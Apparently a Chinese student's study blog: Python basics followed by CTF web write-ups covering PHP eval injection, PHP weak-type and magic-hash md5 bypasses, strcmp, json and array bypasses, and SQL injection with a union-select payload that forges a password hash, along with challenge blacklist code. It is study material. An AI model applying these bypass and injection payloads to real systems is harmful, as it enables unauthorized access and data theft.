默认是字符串的长度)</p><p>endswith（）判断以什么结束，正确返回true，错误返回false</p><p>find()查找一个字符，并返回第一个找到的索引值，跟列表的index差不多。find（字符，开始的索引 默认是0，结束的索引 默认是字符串的长度），如果没有找到返回-1</p><p>format:相当于占位符 %s，但是这个不许要%s的一一对应的关系。</p><p> name=’{0}.1 {1}.1 {0}.2 {1},2’</p><p>name.format(‘no’,’NO’)</p><p>‘no.1 NO.1 no.2 NO,2’</p><p>或者话可以，name=’{name}.1 {name1}.1 {name}.2 {name1},2’</p><p>name.format(name=’no’,name1=’NO’)</p><p>声称字典：c=dict(name=’’)<br>添加：c[‘age’]=20<br>添加key：c=dict.fromkeys(你要的key列表)<br>update，合并，a.update.(c),如果c中有a存在的key，则覆盖a的values值<br>查：get<br>a.get(‘key’)如果存在，返回value，如果不存在，不返回<br>a.get(‘key’,-1)如果不存在返回-1<br>a.keys()返回所有的键值，a.values()返回所有的值，a.items()返回所有的键值和值<br>循环<br>for i in a:<br>print(i)<br>for i in a:<br>print(i,a[i])<br>for i in a.items():<br>print(i)<br>for i,j in a.items():<br>print(i,j)<br>集合<br>无序，不能重复，不可变<br>一个小例子，找出a，b中重复的元素，并将其存入c中<br>a=[1,2,3,12,434,56,23,12,2]<br>b=[1,23,45,2,34,56,23,45,2]<br>c=[]<br>for i in a:<br>if i in b:<br>c.append(i)<br>去重：如果a={1，3，4，1，2，3，4，1}，那么回车后，a={1,2,3,2},自动去重，如果<br>a=[1,2,3,1,2,12,3]是个列表，可以用c=set(a),就可以了，set是英文集合的意思，<br>c={1,2,3,12}<br>增加：add  a.add(元素)，钙元素一定是不可以改变的类型，列表，字典都有不可以，元组<br>是可以的，如果添加的元素该集合中有了，就不可以添加进去了，但是不会报错<br>删除：discard，a.discard(元素)，如果该元素不存在也不会报错<br>pop，a.pop()随机删除，实验几遍不像是随即删除，感觉是从头开始删除，每次删一个<br>remove：跟discard一样。只不过就如果删的是里面没有的，会报错<br>&amp;：求两个集合的相同的元素a{1,2,3,4,5},b={2,3,4,5,6}a&amp;b={2,3,4,5}<br>|:求两个集合的合集a|b={1,2，3，4，5，6}<br>-：如果a中存在b中的元素，b-a={6}<br>^:踢出去两者中都有的元素，a^b={1,6}<br>判断是不是相交：isdisjoint<br>判断是不是子集：issubset<br>判断是不是父集：issuperset<br>intersection：将两个集合中相同的元素取出来，就跟&amp;一样<br>difference_update():相当于a=a-b</p><p>2**4=16，就是2的4次方<br>bin（数字），把十进制换成二进制<br>hex（数字），就是将十进制转换成16进制<br>ord（符号），查询acsii吗</p><p>hash<br>这种转换是一种压缩运算，不能通过结果推算输入，不可逆算法，具有加密特性<br>特行：补课你，计算快<br>作用：密码，数字签名，文件完整性校检</p><p>基于hash的两个数字类型：dict，set<br>set天生去重也是因为hash<br>dict之所以查询速度很快，所采用的是hash和二分法</p><p>用python操作文件<br>1.f=open(file=’文件名’，mode=’w\r\a’),这个文件在你的python中声称<br>2.f.read()度全部，f.readline()读一行，f.readline(想读多少字)，f.readlines()将全部以字符串的形式输出，f.read(想读多少字)<br>3.追加模式，也是以写的方式进行<br>4.write，f.write(想写的字)<br>三种模式不能混合</p><p>循环文件<br>a=open(file=’文件名’)<br>for line in a:<br>print(line)<br>此时会出现，每行之间都有空格，所以我们可以使用print（line.strip()）去掉空行<br>还可以使用，line.split(),将每行变成字符串，这样我们可以更好地筛选信息</p><p>循环从1-100：可以用函数range（100）</p><p>文件操作的其他模式：<br>f.seek（）：移动开始的光标，python3默认使用gbk编码，一个中文是两个字节，一个英文字母是1个字节，a.seek(2)<br>意思是从第二个中文开始<br>f.flush()强制将内存里的东西刷入硬盘：平时只有在f.close()之后，才可以在内存中看到新写入的文件，使用flush可以直接看到<br>f.readable()判断是否可读<br>f.tell()返回光标的位置<br>f.truncate(数字)，从0接到100，如果是f.truncate()表示从0接到光标处，可用于日志截断<br>f.writelines()项文件中写入内容，是字符串</p><p>混合模式有三种<br>a+：追加读，光标回到尾部，可以使用seek（0）使光标回到开始<br>w+：没用<br>r+:读加写，相当于追加的效果，加载尾部，光标回到开始</p><p>修改文件<br>f=open(‘’,’r+’)<br>f.seek()从第几个字符开始<br>f.write(),直接覆盖其他字符</p><p>不占内存的修改文件<br>import os<br>old_file=”hello.txt”<br>new_file=”new.txt”<br>f=open(‘hello.txt’,’r+’)<br>f_new=open(‘new.txt’,’w’)<br>old_str=’wo’<br>new_str=’ni’<br>for line in f:<br>    if ‘wo’ in line:<br>        line=line.replace(old_str,new_str)</p><pre><code>f_new.write(line)</code></pre><p>f.close()<br>f_new.close()<br>os.replace(new_file,old_file)</p><p>写一个脚本，使得，当我们输入新的字符串，被替换的字符串，以及文件名，就会进行替换<br>import sys<br>import os<br>a=sys.argv<br>old_file=a[3]<br>new_file=”new.txt”<br>f=open(a[3],’r+’)<br>f_new=open(‘new.txt’,’w’)<br>old_str=a[1]<br>new_str=a[2]<br>for line in f:<br>    if a[1] in line:<br>        line=line.replace(old_str,new_str)</p><pre><code>f_new.write(line)</code></pre><p>f.close()<br>f_new.close()<br>os.replace(new_file,old_file)<br>f=open(a[3],’r’)<br>print(f.read())</p><p>作业：设置一个登陆注册，如果登陆三次没有成功，就锁定用户：</p><p>c=0<br>answer=input(‘这是我们的网站，您是登陆还是注册：’)<br>if answer==’注册’:<br>    f=open(‘记录表’,’a+’)<br>    shujv=input(‘请输入您的用户名和密码，用空格隔开:’)<br>    shujv=shujv.replace(‘ ‘,’’)<br>    f.write(shujv)<br>    f.write(‘\n’)<br>    f.close()<br>if answer==’登陆’:<br>    def xunhuan():<br>        shujv = input(‘请输入您的用户名和密码，用空格隔开:’)<br>        shujv = shujv.replace(‘ ‘, ‘’)<br>        f = open(‘记录表’, ‘r’)<br>        c = 0<br>        for line in f:<br>            if shujv in line:<br>                if len(shujv) == len(line):<br>                    print(‘登陆成功’)<br>                    exit()<br>        f.close()<br>        print(‘登陆失败，请重新登陆’)<br>        c += 1<br>while c&lt;3:<br>    xunhuan()<br>    c+=1<br>if c &gt;=3:<br>    print(“账号已经被锁定”)<br>    exit()</p><p>光标从第二行开始读文件，是next（f）</p><p>本来说是查股票的<br>为了简便就用了成绩，感觉这样也行</p><p>f=open(‘股票.txt’,’r’,encoding=’utf-8’,errors=’ignore’)<br>keys=[]<br>zidian={}<br>zidian1={}<br>diyipai=f.readline()<br>liebiao=[]<br>diyipai=dict(diyipai.split())<br>while True:<br>    for line in f:<br>        line = list(line.split())<br>        zidian[line[0]] = line<br>    qingqiu = input(“模糊查询：”)<br>    for k, v in zidian.items():<br>        if qingqiu in k:<br>            print(v)<br>    f.seek(0)<br>    next(f)<br>    a = input(“你想筛选成绩的科目”)<br>    c = 0<br>    for k in diyipai.keys():<br>        if k in a[0]:<br>            break<br>        c = c + 1</p><pre><code>b = int(input(&quot;你想筛选成绩&quot;))for line1 in f:    line1 = line1.split()    if int(line1[c]) &gt;= b:        print(line1)</code></pre><p>升级版本：<br>f=open(‘股票.txt’,’r’,encoding=’utf-8’,errors=’ignore’)<br>keys=[]<br>zidian={}<br>zidian1={}<br>diyipai=f.readline()<br>liebiao=[]<br>diyipai=dict(diyipai.split())<br>while True:<br>    for line in f:<br>        line = list(line.split())<br>        zidian[line[0]] = line<br>    qingqiu = input(“模糊查询：”)<br>    def hanshu():<br>        global qingqiu<br>        for k, v in zidian.items():<br>            if qingqiu in k:</p><pre><code>            if len(qingqiu) == 0:                qingqiu = input(&quot;不能是空白请重新输入:&quot;)                hanshu()                return//重要的是，为什么把return加到了这里，如果不加return，则会返回我打了几个空白，就有几条数据，想不明白            else:                print(v)hanshu()f.seek(0)next(f)a = input(&quot;你想筛选成绩的科目:&quot;)c = 0for k in diyipai.keys():    if k in a[0]:        break    c = c + 1b = int(input(&quot;你想筛选成绩:&quot;))for line1 in f:    line1 = line1.split()    if int(line1[c]) &gt;= b:        print(line1)</code></pre><h2>高阶函数</h2><p>满足条件：把函数当作参数传入，或者返回一个函数</p><pre><code>         def jieduizhi(n):              return int(str(n).strip())         def add(x,y,f):              return f(x)+f(y)        print(add(30,-14,jieduizhi))        def qvyvshu(n):              a=-n              return a        print(add(30,18,qvyvshu))        def add1():              return add(10,12,jieduizhi)        print(add1())</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>easy cacl</title>
      <link href="/2021/02/03/cacl/"/>
      <url>/2021/02/03/cacl/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>按理说，一般题目都跟题有关，但是为撒子这个没一点关系，好奇怪</p><span id="more"></span><p>打开是让算数的，就忘了我在哪打开了cacl.php出现了别的界面，看wp好像是说在bp抓包的时候可以看见，我记得我应该是在源代码中找到的，但是emm，现在找不到了，就这样子吧。我想起来了，源码中有</p><pre><code>    &lt;!--I&#39;ve set up WAF to ensure security.--&gt; &lt;script&gt;$(&#39;#calc&#39;).submit(function()&#123;    $.ajax(&#123;        url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),        type:&#39;GET&#39;,        success:function(data)&#123;            $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;        &lt;strong&gt;答案:&lt;/strong&gt;$&#123;data&#125;        &lt;/div&gt;`);        &#125;,        error:function()&#123;            alert(&quot;这啥?算不来!&quot;);        &#125;    &#125;)    return false;&#125;)&lt;/script&gt;</code></pre><p>在这<mark> url:”calc.php?num=”+encodeURIComponent($(“#content”).val()),</mark><br><br>这个跟js有关，这方面还没有开始接触<br></p><pre><code>  获取id为content的HTML标签元素的值,是JQuery  $(&quot;#content&quot;) 同document.getElementById(“content”); $(&quot;#content&quot;).val() 同document.getElementById(“content”).value;</code></pre><p>提示打开cacl。php</p><pre><code>  &lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;]))&#123;show_source(__FILE__);&#125;else&#123;    $str = $_GET[&#39;num&#39;];    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];    foreach ($blacklist as $blackitem) &#123;            if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) &#123;                    die(&quot;what are you want to do?&quot;);            &#125;    &#125;    eval(&#39;echo &#39;.$str.&#39;;&#39;);&#125;?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>preg_match函数详解，foreach</title>
      <link href="/2021/02/03/preg-match%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/"/>
      <url>/2021/02/03/preg-match%E5%87%BD%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>在php中preg_match（）函数是用来执行正则表达式的一个常用的函数。正则表达式中，几乎在所有的编程表达式中都会用到。<br><br>preg_match（）函数用于进行正则表达式匹配，成功给返回1，否则返回0.<br><br>preg_match()成功匹配一次后会停止匹配。<br><br>preg_match(正则表达式，需要匹配检索的对象，可选：储存匹配结果的数组)<br><br>例子</p><pre><code>  &lt;?php  $str=&quot;Daniel J. Gross Catholic High School A. is a faith and family based community committed to developing Christian leaders through educational excellence in the Marianist tradition.&quot;;  if(preg_match(&quot;/[A-Z]. /&quot;,$str,$matches))&#123;  print_r($matches);  &#125;  ?&gt;</code></pre><p>输出结果</p><pre><code> Array ( [0] =&gt; J. )</code></pre><h1>foreach</h1>在php中foreach循环语句，常用于遍历数组，一般有两种使用方法：不取下标，取下标。<br><h1>(一)只取值，不取下标</h1><pre><code>   &lt;?php   foreach (数组 as 值)&#123;    //执行的任务  &#125;   ?&gt;</code></pre><h1>取下标，也取值</h1><pre><code>   &lt;?php  foreach (数组 as 下标 =&gt; 值)&#123;  //执行的任务  &#125;  ?&gt;</code></pre><p>数组<br>    &lt;?php<br>    $students = array(<br>    ‘2010’=&gt;’令狐冲’,<br>    ‘2011’=&gt;’林平之’,<br>    ‘2012’=&gt;’曲洋’,<br>    ‘2013’=&gt;’任盈盈’,<br>    ‘2014’=&gt;’向问天’,<br>    ‘2015’=&gt;’任我行’,<br>    ‘2016’=&gt;’冲虚’,<br>    ‘2017’=&gt;’方正’,<br>    ‘2018’=&gt;’岳不群’,<br>    ‘2019’=&gt;’宁中则’,<br>    );//10个学生的学号和姓名，用数组存储</p><pre><code>//使用循环结构遍历数组,获取学号和姓名  foreach($students as $v)&#123; echo $v;//输出（打印）学号：姓名echo &quot;&lt;br /&gt;&quot;; &#125;?&gt;</code></pre><p>//</p><pre><code>令狐冲林平之曲洋任盈盈向问天任我行冲虚方正岳不群宁中则</code></pre><p>//</p><pre><code>&lt;?php$students = array(&#39;2010&#39;=&gt;&#39;令狐冲&#39;,&#39;2011&#39;=&gt;&#39;林平之&#39;, &#39;2012&#39;=&gt;&#39;曲洋&#39;,&#39;2013&#39;=&gt;&#39;任盈盈&#39;,&#39;2014&#39;=&gt;&#39;向问天&#39;,&#39;2015&#39;=&gt;&#39;任我行&#39;,&#39;2016&#39;=&gt;&#39;冲虚&#39;,&#39;2017&#39;=&gt;&#39;方正&#39;,&#39;2018&#39;=&gt;&#39;岳不群&#39;,&#39;2019&#39;=&gt;&#39;宁中则&#39;, );//10个学生的学号和姓名，用数组存储//使用循环结构遍历数组,获取学号和姓名  foreach($students as $key =&gt; $v)&#123; echo $key.&quot;:&quot;.$v;//输出（打印）学号：姓名echo &quot;&lt;br /&gt;&quot;;&#125;?&gt;</code></pre><p>//</p><pre><code> 2010:令狐冲2011:林平之2012:曲洋2013:任盈盈2014:向问天2015:任我行2016:冲虚2017:方正2018:岳不群2019:宁中则</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>http、knife</title>
      <link href="/2021/02/03/http/"/>
      <url>/2021/02/03/http/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>这道题不难，倒是，因为一点点的跑偏，打开了不应该打开的东西，哈哈哈</p><span id="more"></span><p>f12,打开网页，bp抓包，改包</p><p>第二个，直接上菜刀</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>http头</title>
      <link href="/2021/02/03/http%E5%A4%B4/"/>
      <url>/2021/02/03/http%E5%A4%B4/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>http协议简介</p><span id="more"></span><h1>HTTP(HyperText Transfer Protocol,超文本传输协议)，是一个基于请求与相应，无状态的，应用的协议，常运行在tcp/ip协议传输数据。<h1>1、HTTP报文格式</h1>(1)http请求<p><img src="1.png"></p><p>第一部分：<br><br>请求方式 |空格|路径|空格|协议版本（请求行）<br><br>第二部分：<br><br>头部字段名|：|值（请求头部）<br><br>空行（不能缺少）<br><br>第四部分：<br><br>请求正文（图中没有，一般只有post方式才有）<br></p><h1>(2)、HTTP响应</h1><p><img src="2.png"></p><p>第一部分：<br><br>协议版本|空格|状态码|状态码描述|（状态行）<br><br>第二部分：<br><br>头部字段名|：|值|（响应头部）<br><br>第三部分：<br><br>空行（必不可少）<br><br>第四部分：<br><br>响应正文<br></p><h1>3、常有的状态码</h1><pre><code> (1）、200：服务器已成功处理了请求并提供了请求的网页。 (2）、204： 服务器成功处理了请求，但没有返回任何内容。 (3）、301： 请求的网页已永久移动到新位置。当URLs发生变化时，使用301代码。搜索引擎索引中保存新的URL。（4）、302： 请求的网页临时移动到新位置。搜索引擎索引中保存原来的URL。（5）、304： 如果网页自请求者上次请求后没有更新，则用304代码告 诉搜索引擎机器人，可节省带宽和开销。（6）、400： 服务器不理解请求的语法。（7）、403： 服务器拒绝请求。（8）、404： 服务器找不到请求的网页。服务器上不存在的网页经常会返回此代码。（9）、410 ：请求的资源永久删除后，服务器返回此响应。该代码与 404（未找到）代码相似，但在资源以前存在而现在不存在的情况下，有时用来替代404 代码。如果资源已永久删除，应当使用 301 指定资源的新位置。（10）、500 ：服务器遇到错误，无法完成请求。（11）、503： 服务器目前无法使用（由于超载或停机维护）。</code></pre><h1>4、 HTTP请求方法</h1>    1、OPTIONS：返回服务器针对特定资源所支持的HTTP请求方法，也可以利用向web服务器发送‘*’的请求来测试服务器的功能性    2、HEAD：向服务器索与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以再不必传输整个响应内容的情况下，就可以获取包含在响应小消息头中的元信息。    3、GET：向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中，例如在Web Application中，其中一个原因是GET可能会被网络蜘蛛等随意访问。Loadrunner中对应get请求函数：web_link和web_url    4、POST：向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。 Loadrunner中对应POST请求函数：web_submit_data,web_submit_form    5、PUT：向指定资源位置上传其最新内容    6、DELETE：请求服务器删除Request-URL所标识的资源    7、TRACE：回显服务器收到的请求，主要用于测试或诊断    8、CONNECT：HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。注意：大多数情况下，使用的是GET和HEAD/POST方法，并且这些方法区分大小写，当某个请求的资源不支持对应的请求方法的时候，服务器应当返回状态码405；当服务器不认识或者不支持对应的请求方法时，应返回状态码501。<h1>5、HTTP头部字段</h1><pre><code>（1）、User-Agent：告诉网站服务器，访问者是通过什么工具来请求的；（2）、X-Forwarded-For ：用来表示HTTP请求端真实IP；（3）、X-Forwarded-IP：同X-Forwarded-For；（4）、Accept-Language：设置接受的语言； (5）、Accept-Encoding：是浏览器发给服务器，声明浏览器支持的编码类型；（6）、Content-Type 用于表明发送数据流的类型，服务器根据编码服务器根据编码类型使用特定的解析方式，获取数据流中的数据；（7）、Cookie：辨认用户状态及身份的；（8）、Referer ：当浏览器向web服务器发送请求时，一般会带上Referer ，告诉服务器该网页是从哪个页面链接过来的。</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>基础知识积累</title>
      <link href="/2021/02/03/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/"/>
      <url>/2021/02/03/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%A7%AF%E7%B4%AF/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p>一、bugku文件包含</p><pre><code>  &lt;?php include &quot;flag.php&quot;; $a = @$_REQUEST[&#39;hello&#39;]; eval( &quot;var_dump($a);&quot;); show_source(__FILE__); ?&gt;</code></pre><p>我知道的解就是system（’tac f*’），还有就是file(“flag.php”)<br>,但看到了有些大佬其他的做题方法，记录一下。<br> 在sql注入的时候，我们常常使用’进行闭合，这里里面有eval函数，是执行的代码段，我们可以尝试构造?hello=1);print_r(flag.php//print_r() 函数用于打印变量，以更容易理解的形式展示。<br>结果是int（1），flag.php<br><br>大佬们构造的是<mark>hello=);print_r(file(“./flag.php”));//</mark><br><br>eval函数中，”“内部为代码，//只在代码中起作用，相当于只注释了）；<br><br>第二点，file_get_contents与file及var_dump,print_r和echo区别<br></p><pre><code> &lt;?php  include buu.php;  $a=file(&quot;buu.php&quot;);  print_r($a);?&gt;</code></pre><p>可以成功回显buu.php的内容（file() 函数把整个文件读入一个数组中，以数组的形势返回。）</p><pre><code>      Array ( [0] =&gt; flag=&#123;1234&#125; ) </code></pre><p>用file_get_concents测试</p><pre><code>     flag=&#123;1234&#125;</code></pre><p>是直接返回内容</p><p>这道题，用file_get_concents是不可以的，可能是因为它读取的是字符串。<br>     1、echo 可以输出一个或多个字符串 ，多个以逗号隔开就行</p><pre><code> 2、print 也可以输出一个或多个字符串 ，多个要用连接符 3、print_r()可以打印数组；对象</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>php弱类型</title>
      <link href="/2021/02/02/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"/>
      <url>/2021/02/02/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>0x01前言</h1>php弱类型是指，在对php的变量进行初始化的时候，我们不用对其的变量进行类型的定义。<h1>0x02知识介绍</h1>php有两种比较的符号 == 与===<pre><code>&lt;?php$a==$b;$a===$b?&gt;</code></pre><p>===在进行比较的时候，会先判断两种字符的类型是否相同，在比较，值是不是相同，就是全等。<br><br>==在进行比较的时候，会先将字符串类型转化成相同，在比较。<br></p><pre><code> 如果比较一个数字和字符串或者比较涉及到数字内容的字符串时，则字符串会被转换成数值并且按照数值来比较</code></pre><h1>这里明确说了如果一个数值和字符串进行比较的时候，会将字符串转化成数值</h1><pre><code> &lt;?php  var_dump(&#39;admin&#39;==0);//true var_dump(&#39;1admin&#39;==0);//true var_dump(&#39;admin1&#39;==1);//false var_dump(&#39;0e12345&#39;==&#39;0e23456&#39;);//true ?&gt;</code></pre><p>结论</p><pre><code> 1.观察上述代码，‘admin’==0 比较的时候，会将admin转化成数值，强制转化，由于admin是字符串，转化结果是0自然和0相等 2.‘1admin’==1是对的，但是‘admin1’==1是错的，相反他等于0，这是为什么呢？ 3.‘0e123456’==‘0e2345’相互比较的时候，会将0e这类字符串识别为科学计数法，0的无论多少次方都是0，所以相等。</code></pre><h1>对于上述问题，查询php手册</h1><pre><code>当一个字符串当作一个数值来取值时，其结果和类型如下：如果该字符串没有包含‘.’,&#39;e&#39;,&#39;E&#39;并且其数值在整型的范围内，该字符串被当作整型来取值，其他所有情况被当作float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其为0.</code></pre><p>例子</p><pre><code> &lt;?php  $t=1+&#39;10.5&#39;;//11.5  $t=1+&#39;-1.3e3&#39;;//-1299  $t=1+&quot;bob-1.3e3&quot;//1  $t=1+&quot;2admin&quot;;//3  $t=1+&quot;admin1&quot;;//1  ?&gt;</code></pre><h1>0x03 实战</h1><i>md5绕过（hash比较缺陷）</i><pre><code>&lt;?php if(isset($_GET[&#39;username&#39;])&amp;&amp;isset($_GET[&#39;password&#39;]))&#123;$logined=true; $usename=$_GET[&#39;usename&#39;]; $password=$_GET[&#39;password&#39;]; if(!ctype_alpha($usernmae))&#123;$logined=false;&#125; if(!is_numeric($password))&#123;$logined=false;&#125; if(md5($username)!=md5($password))&#123;$logined=false&#125; if($l)&#123; echo &quot;successful&quot;&#125;else echo&quot;false&quot;;&#125;?&gt;</code></pre><p>绕输入数字和字符串，且md5值相等，如240610708和QNKCDZO</p><pre><code>    0e开头的md5和原值：    QNKCDZO    0e830400451993494058024219903391    240610708    0e462097431906509019562988736854    s878926199a    0e545993274517709034328855841020    s155964671a    0e342768416822451524974117254469    s214587387a    0e848240448830537924465865611904</code></pre><p>这么多就够用了</p><h1>json绕过</h1><pre><code>   &lt;?php   if(isset($_POST[&#39;message&#39;]))&#123;   $message=json_decode($_POST[&#39;message&#39;]);   $key=&quot;*********&quot;;   if($message-&gt;key==$key)&#123;   echo &quot;flag&quot;;              &#125;   else echo &quot;fail&quot;;   &#125;   else&#123;echo &quot;````&quot;;&#125;?&gt;//json_decode是对json字符串进行解码，使其变成php变量。</code></pre><p>举例</p><pre><code> &lt;?php $json = &#39;&#123;&quot;a&quot;:1,&quot;b&quot;:2,&quot;c&quot;:3,&quot;d&quot;:4,&quot;e&quot;:5&#125;&#39;; var_dump(json_decode($json)); var_dump(json_decode($json, true)); ?&gt;</code></pre><p>结果</p><pre><code> object(stdClass)#1 (5) &#123;[&quot;a&quot;] =&gt; int(1)[&quot;b&quot;] =&gt; int(2)[&quot;c&quot;] =&gt; int(3)[&quot;d&quot;] =&gt; int(4)[&quot;e&quot;] =&gt; int(5)&#125;array(5) &#123;[&quot;a&quot;] =&gt; int(1)[&quot;b&quot;] =&gt; int(2)[&quot;c&quot;] =&gt; int(3)[&quot;d&quot;] =&gt; int(4)[&quot;e&quot;] =&gt; int(5)&#125;</code></pre><p>输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于$key的值，但是key的值我们不知道，可以利用0==‘admin’进行绕过，构造 message={“key”:0}</p><h1>array_search is_array绕过</h1><pre><code>  &lt;?php   if（!is_array($_GET[&#39;test&#39;])）&#123;exit();&#125;   $test=$_GET[&#39;test&#39;];   for($i=0;$i&lt;count($test);$i++)&#123;      if($test[$i]===&quot;admin&quot;)&#123;        echo &quot;error&quot;;        exit();       &#125;    $test[$i]=intval($test[$i]);&#125;  if(array_search(&quot;admin&quot;,$test)===0)&#123;    echo &quot;flag&quot;;&#125;  else echo &quot;false&quot;;    ?&gt;</code></pre><p>array_search() 函数在数组中搜索某个键值，并返回对应的键名。<br><br>先判断传入的是不是数组，不是退出，然后遍历每个数组的值，并且每个数组的值不能和admin相等，并且将每个值转化为int类型，在判断传入的数组是否有admin，有则返回flag<br></p><pre><code> test[]=0可以绕过</code></pre><p>下面是对array——search的介绍。</p><pre><code>mixed array_search(mixed $needle,array $haystack [, bool $strict=false])</code></pre><p>$needle,$haystack必需，$strict可选，函数判断$haystack中值是存在$needle,存在则返回键值。第三个参数默认为false，如果设置为 true，则在数组中检查给定值的类型，比如在下个例子中数字 5 和字符串 5 是不同的。</p><pre><code>&lt;?php $a=array(&quot;a&quot;=&gt;&quot;5&quot;,&quot;b&quot;=&gt;5,&quot;c&quot;=&gt;&quot;5&quot;); echo array_search(5,$a,true); ?&gt;//输出 b</code></pre><p>其实他类似与==</p><h1>strcmp漏洞绕过(php版本在5.3以后)</h1><pre><code> &lt;?php $password=&quot;******&quot;; if(isset($_POST[&#39;password&#39;]))&#123; if(strcmp($_POST[&#39;password&#39;],$password)==0)&#123;  echo &quot;right!!!&quot;;exit();&#125;else &#123; echo&quot;wrong!&quot;;&#125;&#125;?&gt;</code></pre><p>strmp是比较两个字符串，如果str1&lt;str2则返回&lt;0,反之大于0，如果相等返回0.我们不知道￥password的值，题目要求strcmp判断的接受的值与$password必须相等，strcmp传入的期望类型是字符串型，如果传入数组该怎么样？<br><br>我们传入password[]=12,，是因为函数接受不了不符合的字符串类型，将发生错误，但是还是判定为相等。</p><h1>switch绕过</h1><pre><code>     &lt;?php   $a=&quot;4admin&quot;;    switch ($a) &#123;case 1:    echo &quot;fail1&quot;;    break;case 2:    echo &quot;fail2&quot;;    break;case 3:    echo &quot;fail3&quot;;    break;case 4:    echo &quot;sucess&quot;;  //结果输出success;    break;default:    echo &quot;failall&quot;;    break;      &#125;    ?&gt;</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buu havefun</title>
      <link href="/2021/01/31/buu/"/>
      <url>/2021/01/31/buu/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>have fun</p><span id="more"></span><p>签到级别的吧，shift+f12就可以了</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>badysqli</title>
      <link href="/2021/01/30/bodysqli/"/>
      <url>/2021/01/30/bodysqli/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.png"></p><p>体验了sqlmap一把梭的乐趣，但是没用，这个题目上没有提示md5加密，我是看wp才知道<br><br>后端语句</p><pre><code>   &lt;?$name = $_POST[&#39;name&#39;];$passwd = md5($_POST[&#39;pw&#39;]);$sql = &quot;select * from user where username = &#39;$name&#39;&quot;;$query = mysql_query($sql);//mysql_query() 函数执行一条 MySQL 查询if (!strcasecmp($passwd, $query[passwd])) &#123;//strcasecmp比较两个字符串（不区分大小写)echo $flag;&#125; else &#123;  echo(&quot;Wrong Pass&quot;);&#125;</code></pre><p>知道一个知识点是如果在数据库中查找一个不存在的数据，数据库可以自动帮我们生成。</p><p><img src="2.png"></p><p>现在开始解题，<br>fuzz测试知道or，）被过滤，开始查出字段是3.<br><br>然后，在这个用户名输入admin返回时wrong pass ,其他都是nouser,所以猜测一定存在admin的用户名，现在主要做的就是判断name这个字段的位置。输入1’ union select 1,’admin’,2 #是wrong pass，1’ union select 1,2，’admin’#是wrong user，所以我们可以构造1’ union select 1,’admin’,’202cb962ac59075b964b07152d234b70’ #密码输入123，可以得到flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>suctf sql</title>
      <link href="/2021/01/30/suctf/"/>
      <url>/2021/01/30/suctf/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><p><img src="1.png"></p><pre><code>&lt;?phpsession_start();include_once &quot;config.php&quot;;$post = array();$get = array();global $MysqlLink;//GetPara();$MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);if(!$MysqlLink)&#123;    die(&quot;Mysql Connect Error!&quot;);&#125;$selectDB = mysqli_select_db($MysqlLink,$dataName);if(!$selectDB)&#123;    die(&quot;Choose Database Error!&quot;);&#125;foreach ($_POST as $k=&gt;$v)&#123;    if(!empty($v)&amp;&amp;is_string($v))&#123;        $post[$k] = trim(addslashes($v));    &#125;&#125;foreach ($_GET as $k=&gt;$v)&#123;    &#125;&#125;//die();?&gt;</code></pre><p>链接数据库并对应键值</p><pre><code>&lt;?phpif(isset($post[&#39;query&#39;]))&#123;    $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;    //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]));    if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#39;query&#39;]))&#123;        //echo $post[&#39;query&#39;];        die(&quot;Nonono.&quot;);    &#125;    if(strlen($post[&#39;query&#39;])&gt;40)&#123;        die(&quot;Too long.&quot;);    &#125;    $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;    mysqli_multi_query($MysqlLink,$sql);    do&#123;        if($res = mysqli_store_result($MysqlLink))&#123;            while($row = mysqli_fetch_row($res))&#123;                print_r($row);            &#125;        &#125;    